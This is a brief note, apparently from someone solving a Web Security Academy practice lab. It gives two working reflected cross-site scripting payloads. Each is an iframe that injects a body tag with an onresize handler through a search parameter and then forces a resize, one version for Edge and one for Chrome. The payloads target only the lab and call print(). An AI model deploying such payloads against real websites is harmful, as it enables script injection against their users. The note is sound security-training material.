Payload I use to exploit with Microsoft Edge Browser:
```
<iframe src="https://0a2800aa049fcf158088621c00520025.web-security-academy.net/?search=%27%3C%2Fh1%3E%3Cbody%20onresize%3D%22print%28%29%22%3E" onload="window.open();window.resizeTo(10,10);window.resizeTo(200,300);">
```

However, I don't know why the `window.resizeTo()` doesn't work in Chrome, so after watching the solution I found another way to change window style LOL.
```
<iframe src="https://0a2800aa049fcf158088621c00520025.web-security-academy.net/?search=%27%3C%2Fh1%3E%3Cbody%20onresize%3D%22print%28%29%22%3E" onload="this.style.width=10">
```
